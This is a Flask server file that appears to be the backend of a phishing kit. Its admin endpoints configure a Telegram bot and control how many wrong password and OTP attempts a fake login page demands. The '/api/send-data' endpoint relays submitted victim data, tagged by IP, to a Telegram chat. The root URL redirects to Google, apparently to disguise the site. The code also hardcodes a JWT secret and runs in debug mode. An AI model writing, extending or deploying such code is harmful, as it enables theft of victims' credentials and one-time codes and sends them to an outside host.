import contextlib

import requests
from database import Account, Config
from flask import (Flask, jsonify, make_response, redirect, render_template,
                   request, send_from_directory)
from flask_cors import CORS
from flask_jwt_extended import JWTManager, create_access_token, jwt_required

app = Flask(__name__, static_folder="static",
            template_folder="static", static_url_path="/static")

app.config['JWT_SECRET_KEY'] = 'VIPVCL'
jwt = JWTManager(app)
CORS(app, supports_credentials=True)


def login(username: str, password: str):
    db_data = Account().get_info()
    db_username = db_data.get('username')
    db_password = db_data.get('password')
    return username == db_username and password == db_password


@app.route('/api/login', methods=['POST'])
def login_route():
    data = request.json
    if not data:
        return jsonify({"msg": "???"}), 400

    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({"msg": "???"}), 400

    if login(username, password):
        access_token = create_access_token(identity=username)
        return jsonify({"msg": "Đăng nhập thành công", "access_token": access_token}), 200
    return jsonify({"msg": "Sai mật khẩu"}), 401


@app.route('/api/get-telegram-config')
@jwt_required()
def get_telegram_config():
    config = Config()
    telegram_config = config.get_info()
    try:
        api_token = telegram_config["api_token"]
        chat_id = telegram_config["chat_id"]
    except Exception as e:
        print(e)
        api_token = ""
        chat_id = ""
    return jsonify(status=200, api_token=api_token, chat_id=chat_id)


@app.route('/api/get-website-config')
def get_website_config():
    config = Config().get_info()
    incorrect_password_attempts = config["incorrect_password_attempts"]
    incorrect_otp_attempts = config["incorrect_otp_attempts"]
    delay_time = config["delay_time"]
    loading_time = config["loading_time"]
    return jsonify(incorrect_password_attempts=incorrect_password_attempts, incorrect_otp_attempts=incorrect_otp_attempts, delay_time=delay_time, loading_time=loading_time)


@app.route('/api/set-telegram-config', methods=["POST"])
@jwt_required()
def set_telegram_config():
    if not request.json:
        return jsonify({'error': 'No JSON data provided'}), 400
    api_token = request.json.get('api_token')
    chat_id = request.json.get('chat_id')
    old_data = Config().get_info()
    try:
        incorrect_password_attempts = int(
            old_data["incorrect_password_attempts"])
        incorrect_otp_attempts = int(old_data["incorrect_otp_attempts"])
        delay_time = int(old_data["delay_time"])
        loading_time = int(old_data["loading_time"])
    except Exception:
        incorrect_password_attempts = 0
        incorrect_otp_attempts = 0
        delay_time = 0
        loading_time = 0
    Config().change_info(api_token, chat_id, incorrect_password_attempts,
                         incorrect_otp_attempts, delay_time, loading_time)
    return jsonify({'status': 200}), 200


@app.route('/api/set-website-config', methods=["POST"])
@jwt_required()
def set_website_config():
    old_data = Config().get_info()
    api_token = old_data["api_token"]
    chat_id = old_data["chat_id"]
    if request.json:
        incorrect_password_attempts = request.json.get(
            'incorrect_password_attempts')
        incorrect_otp_attempts = request.json.get('incorrect_otp_attempts')
        delay_time = request.json.get('delay_time')
        loading_time = request.json.get('loading_time')
        Config().change_info(api_token, chat_id, incorrect_password_attempts,
                             incorrect_otp_attempts, delay_time, loading_time)
        return jsonify({'status': 200}), 200
    else:
        return jsonify({'status': 400}), 400


@app.route('/api/change-info', methods=["POST"])
@jwt_required()
def change_info():
    if not request.json:
        return jsonify({'status': 400}), 400
    username = request.json.get('username')
    password = request.json.get('password')
    Account().change_info(username, password)
    return jsonify({'status': 200}), 200


@app.route('/api/get-state-login', methods=['GET'])
@jwt_required()
def get_state_login():
    return jsonify({'logged_in': True}), 200


@app.route('/api/logout', methods=["POST"])
@jwt_required()
def clear_access_token():
    response = make_response("Logout!")
    response.set_cookie('accessToken', '', expires=0)
    return response


list_ip = {}


@app.route('/api/send-data', methods=['POST'])
def get_data():
    if request.json:
        config = Config().get_info()
        message = request.json.get('message')
        ip = request.json.get('ip')
        count = request.json.get('count')
        with contextlib.suppress(Exception):
            count = int(count)
        message = str(message)
        token = config['api_token']
        chat_id = config['chat_id']
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        url_update = f"https://api.telegram.org/bot{token}/editMessageText"
        data = {"chat_id": chat_id,
                "text": message, "parse_mode": "HTML"}
        if count == 0 and ip in list_ip and "message_id" in list_ip[ip]:
            list_ip[ip].pop("message_id")
            list_ip.pop(ip)
        if ip in list_ip and "message_id" in list_ip[ip]:
            try:
                message_id = list_ip[ip]["message_id"]
                data["message_id"] = message_id
                response = requests.post(url_update, data=data).json()

            except Exception as e:
                print("Editing:", e)
        else:
            try:
                response = requests.post(url, data=data).json()
                message_id = response["result"]["message_id"]
                list_ip[ip] = {"message_id": message_id}
            except Exception as e:
                print("Sending:", e)
    return jsonify(status=200)


@app.route('/')
def index():
    return redirect("https://www.google.com")


@app.route("/<path:path>")
def catch_all(path):
    if "." in path:
        return send_from_directory(app.static_folder, path)
    return render_template('index.html')


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
